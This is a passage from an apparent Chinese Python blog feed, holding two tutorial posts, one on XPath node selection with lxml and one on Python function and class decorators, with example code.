class="code"><pre><span class="line"><span class="comment"># 1.获取所有节点             //</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">html=etree.parse(<span class="string">'test.html'</span>,etree.HTMLParser())</span><br><span class="line">result=html.xpath(<span class="string">'//*'</span>)  <span class="comment">#//代表获取子孙节点，*代表获取所有</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如要获取li节点，可以使用//后面加上节点名称，然后调用xpath()方法</span></span><br><span class="line">html.xpath(<span class="string">'//li'</span>)   <span class="comment">#获取所有子孙节点的li节点</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.获取子节点            /</span></span><br><span class="line">result=html.xpath(<span class="string">'//li/a'</span>)  <span class="comment">#通过追加/a选择所有li节点的所有直接a节点，因为//li用于选中所有li节点，/a用于选中li节点的`所有直接子节点a`</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.获取父节点       ..           parent::</span></span><br><span class="line"><span class="comment"># 使用`..`来实现也可以使用`parent::`来获取父节点</span></span><br><span class="line">html=etree.HTML(text, etree.HTMLParser())</span><br><span class="line">result=html.xpath(<span class="string">'//a[@href="link2.html"]/../@class'</span>)</span><br><span class="line">result1=html.xpath(<span class="string">'//a[@href="link2.html"]/parent::*/@class'</span></span><br><span class="line"></span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line"><span class="comment"># 4.根据属性匹配节点             //div[@class='box']</span></span><br><span class="line">html=etree.HTML(text, etree.HTMLParser())</span><br><span class="line">result=html.xpath(<span class="string">'//li[@class="item-1"]'</span>)</span><br><span class="line">print(result)                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                   </span><br><span class="line"><span class="comment"># 5.获取节点中的文本       text()</span></span><br><span class="line">html=etree.HTML(text,etree.HTMLParser())</span><br><span class="line">result=html.xpath(<span class="string">'//li[@class="item-1"]/a/text()'</span>) <span class="comment">#获取a节点下的内容</span></span><br><span class="line">result1=html.xpath(<span class="string">'//li[@class="item-1"]//text()'</span>) <span class="comment">#获取li下所有子孙节点的内容           </span></span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line"><span class="comment"># 6. 获取属性               @href, @class,  @src</span></span><br><span class="line">result=html.xpath(<span class="string">'//li/a/@href'</span>)  <span class="comment">#获取a的href属性</span></span><br><span class="line">result=html.xpath(<span class="string">'//li//@href'</span>)   <span class="comment">#获取所有li子孙节点的href属性</span></span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line"><span class="comment"># 7. 属性多值匹配节点(某个属性的值有多个时，一个节点有多个属性值)     contains()</span></span><br><span class="line">text1=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="aaa item-0"&gt;&lt;a href="link1.html"&gt;第一个&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="bbb item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">html=etree.HTML(text1,etree.HTMLParser())</span><br><span class="line">result1=html.xpath(<span class="string">'//li[contains(@class,"aaa")]/a/text()'</span>)              </span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.多属性匹配（根据多个属性确定一个节点， 多个节点有相同的属性值）      and</span></span><br><span class="line">text1=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="aaa" name="item"&gt;&lt;a href="link1.html"&gt;第一个&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="aaa" name="fore"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">html=etree.HTML(text1,etree.HTMLParser())</span><br><span class="line">result=html.xpath(<span class="string">'//li[@class="aaa" and @name="fore"]/a/text()'</span>)</span><br><span class="line">result1=html.xpath(<span class="string">'//li[contains(@class,"aaa") and @name="fore"]/a/text()'</span>)</span><br><span class="line"> </span><br><span class="line">                   </span><br><span class="line"></span><br><span class="line">                   </span><br><span class="line"><span class="comment"># 9. 按序选择</span></span><br><span class="line"><span class="comment"># 可能同时匹配多个节点，但我们只想要其中的某个节点，如第二个节点或者最后一个节点，这时可以利用中括号引入索引的方法获取特定次序的节点：   [1], [last()],    position()</span></span><br><span class="line">result=html.xpath(<span class="string">'//li[contains(@class,"aaa")]/a/text()'</span>) <span class="comment">#获取所有li节点下a节点的内容</span></span><br><span class="line">result1=html.xpath(<span class="string">'//li[1][contains(@class,"aaa")]/a/text()'</span>) <span class="comment">#获取第一个</span></span><br><span class="line">result2=html.xpath(<span class="string">'//li[last()][contains(@class,"aaa")]/a/text()'</span>) <span class="comment">#获取最后一个</span></span><br><span class="line">result3=html.xpath(<span class="string">'//li[position()&gt;2 and position()&lt;4][contains(@class,"aaa")]/a/text()'</span>) <span class="comment">#获取第三个</span></span><br><span class="line">result4=html.xpath(<span class="string">'//li[last()-2][contains(@class,"aaa")]/a/text()'</span>) <span class="comment">#获取倒数第三个</span></span><br><span class="line"><span class="comment"># XPath的函数： http://www.w3school.com.cn/xpath/xpath_functions.asp</span></span><br><span class="line">        </span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line"><span class="comment"># 10. 节点轴选择</span></span><br><span class="line"><span class="comment"># 包括获取子元素、兄弟元素、父元素、祖先元素等        </span></span><br><span class="line">result=html.xpath(<span class="string">'//li[1]/ancestor::*'</span>)  <span class="comment">#获取所有祖先节点</span></span><br><span class="line">result1=html.xpath(<span class="string">'//li[1]/ancestor::div'</span>)  <span class="comment">#获取div祖先节点</span></span><br><span class="line">result2=html.xpath(<span class="string">'//li[1]/attribute::*'</span>)  <span class="comment">#获取所有属性值</span></span><br><span class="line">result3=html.xpath(<span class="string">'//li[1]/child::*'</span>)  <span class="comment">#获取所有直接子节点</span></span><br><span class="line">result4=html.xpath(<span class="string">'//li[1]/descendant::a'</span>)  <span class="comment">#获取所有子孙节点的a节点</span></span><br><span class="line">result5=html.xpath(<span class="string">'//li[1]/following::*'</span>)  <span class="comment">#获取当前子节之后的所有节点</span></span><br><span class="line">result6=html.xpath(<span class="string">'//li[1]/following-sibling::*'</span>)  <span class="comment">#获取当前节点的所有同级节点            </span></span><br><span class="line"><span class="comment"># 更多轴的用法可参考：http://www.w3school.com.cn/xpath/xpath_axes.asp</span></span><br></pre></td></tr></table></figure><blockquote><p>本文参考：<a href="https://www.cnblogs.com/zhangxinqi/p/9210211.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhangxinqi/p/9210211.html</a>        博主写的很详细，也很美观</p></blockquote><blockquote><p>XPath的更多用法参考：<a href="http://www.w3school.com.cn/xpath/index.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/xpath/index.asp</a></p></blockquote><blockquote><p>python lxml库的更多用法参考：<a href="http://lxml.de/" target="_blank" rel="noopener">http://lxml.de/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h6 id=&quot;XPath&quot;&gt;&lt;a href=&quot;#XPath&quot; class=&quot;headerlink&quot; title=&quot;XPath&quot;&gt;&lt;/a&gt;XPath&lt;/h6&gt;&lt;p&gt;XPath，全称 XML Path Language，即 XML 路径语言，它是一门在 XML 文档中查找信息的语言
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="XPath" scheme="http://www.xpshuai.cn/tags/XPath/"/>
    
  </entry>
  
  <entry>
    <title>python基础-装饰器</title>
    <link href="http://www.xpshuai.cn/python%E5%9F%BA%E7%A1%80-%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
    <id>http://www.xpshuai.cn/python基础-装饰器/</id>
    <published>2020-02-19T11:50:30.000Z</published>
    <updated>2020-02-20T10:13:37.000Z</updated>
    
    <content type="html"><![CDATA[<h6 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###函数的装饰器,本质上就是一个闭包</span></span><br><span class="line"><span class="comment">## 概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">f1</span><span class="params">(func)</span>:</span></span><br><span class="line">    print(<span class="string">'f1 runing'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f2</span><span class="params">(y)</span>:</span></span><br><span class="line">        print(<span class="string">'f2 running'</span>)</span><br><span class="line">        <span class="keyword">return</span>  func(y) +<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> f2</span><br><span class="line"></span><br><span class="line"><span class="meta">@f1    #装饰器 (@符号加函数名,装饰上了gun函数)   #相当于f1(gun)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gun</span><span class="params">(m)</span>:</span></span><br><span class="line">    print(<span class="string">'gun runing'</span>)</span><br><span class="line">    <span class="keyword">return</span> m*m</span><br><span class="line"></span><br><span class="line"><span class="comment">## @f1  -&gt;   f1( gun) -&gt; f2</span></span><br><span class="line">n=gun(<span class="number">5</span>)    <span class="comment">#   gun(5) -&gt; 就是在运行  f2(5)</span></span><br><span class="line">print(n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#############例子:</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_time</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">new_fun</span><span class="params">(*args,**kwargs)</span>:</span></span><br><span class="line">        t0 = time.time()</span><br><span class="line">        print(<span class="string">'star time: %s'</span>%(time.strftime(<span class="string">'%X'</span>,time.localtime())) )</span><br><span class="line">        back = func(*args,**kwargs)</span><br><span class="line">        print(<span class="string">'end time: %s'</span>%(time.strftime(<span class="string">'%X'</span>,time.localtime())) )</span><br><span class="line">        print(<span class="string">'run time: %s'</span>%(time.time() - t0))</span><br><span class="line">        <span class="keyword">return</span> back</span><br><span class="line">    <span class="keyword">return</span> new_fun</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@run_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">'%dx%d=%2s'</span>%(j,i,i*j),end = <span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">print</span> ()</span><br><span class="line"><span class="comment">#@run_time -&gt; run_time(test2)  -&gt; new_fun</span></span><br><span class="line">n = test2(<span class="number">10</span>)  <span class="comment">#就相当于运行new_time(5)</span></span><br></pre></td></tr></table></figure><h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写一个login函数  然后写一个装饰器，模拟登录过程：让程序延迟3秒 在延迟过程中输出正在验证</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">def login():</span></span><br><span class="line"><span class="string">    print('登录成功')</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_required</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrpper</span><span class="params">(*args,**kwargs)</span>:</span></span><br><span class="line">        print(<span class="string">'正在验证...'</span>)</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args,**kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrpper</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'登录成功'</span>)</span><br><span class="line">   <span class="comment">#return  'code:200'</span></span><br><span class="line"></span><br><span class="line">login()</span><br></pre></td></tr></table></figure><h5 id="类作为装饰器"><a href="#类作为装饰器" class="headerlink" title="类作为装饰器"></a>类作为装饰器</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 用__call__方法</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tset_Class</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,func)</span>:</span>  <span class="comment"># 传进来函数</span></span><br><span class="line">        print(<span class="string">'正在实例化'</span>)</span><br><span class="line">        self.func = func</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args, **kwargs)</span>:</span>   <span class="comment">#类装饰器, 一定要写__call__方法</span></span><br><span class="line">        print(<span class="string">'这是call方法'</span>)</span><br><span class="line">        <span class="keyword">return</span> self.func</span><br><span class="line"></span><br><span class="line"><span class="meta">@Tset_Class</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'这是一个测试函数'</span>)</span><br><span class="line"></span><br><span class="line">n =  test()   <span class="comment">#    self.func : test 函数体</span></span><br><span class="line">n()           <span class="comment">#   n()  调用test（）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  1.  @Tset_Class  ：  Tset_Class( test )  -&gt; 相当于：t = Tset_Class( test )</span></span><br><span class="line"><span class="comment">#  2.  test()  -&gt;  相当于：   调用实例的call方法 -&gt; 返回 self.func函数体</span></span><br><span class="line"><span class="comment">#  3.  n =  test()   ，n()  调用test（）</span></span><br></pre></td></tr></table></figure><h6 id="类中常见的几种装饰器"><a href="#类中常见的几种装饰器" class="headerlink" title="类中常见的几种装饰器"></a>类中常见的几种装饰器</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">()</span>:</span></span><br><span class="line">    aa = <span class="number">123</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        self.__name = name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property  # 把方法变成属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        print( self.__name)</span><br><span class="line">        <span class="keyword">return</span>  self.__name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @get_name.setter   # 可以让get方法，变成set方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        self.__name = name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property  # 把方法变成属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">po</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'asdfasdfasdfasdaf'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">        print(<span class="string">'staticmethod  func'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(cls)</span>:</span></span><br><span class="line">        print(cls.aa)  <span class="comment"># 可以访问类属性</span></span><br><span class="line">        print(<span class="string">'classmethod func '</span>)</span><br><span class="line"></span><br><span class="line">t = Test(<span class="string">'jianeng'</span>)</span><br><span class="line"></span><br><span class="line">t.show()</span><br><span class="line"><span class="comment"># @property</span></span><br><span class="line"><span class="comment"># t.get_name = 4   # get_name.setter 没有写的时候， = 4 会报错</span></span><br><span class="line"><span class="comment"># t.get_name</span></span><br><span class="line"><span class="comment"># t.po</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @staticmethod     #没有self</span></span><br><span class="line">t.test()   <span class="comment"># 没有self  ，实例不能调用。</span></span><br><span class="line">Test.test()  <span class="comment"># 类名可以直接调用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###  @classmethod    #类方法, 一般是用来做封装  class名字已经传进去了</span></span><br><span class="line">Test.show()  <span class="comment">#有self， 类名不能直接调用</span></span><br><span class="line">t.show()</span><br><span class="line"><span class="comment">##静态方法装饰器： staticmethod    类调用与实例调用无差别， 也不需要self参数，类似于普通函数   不需实例化就可以调用,直接用类名调用   （与实例解绑）， 不能访问其他的类属性与方法（相当于类的方法）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##类方法装饰器： classmethod        self参数被换成cls参数， 自动传入对应的类  可以访问类属性与其他类方法</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h6 id=&quot;装饰器&quot;&gt;&lt;a href=&quot;#装饰器&quot; class=&quot;headerlink&quot; title=&quot;装饰器&quot;&gt;&lt;/a&gt;装饰器&lt;/h6&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="装饰器" scheme="http://www.xpshuai.cn/tags/%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
    
  </entry>
  
</feed>
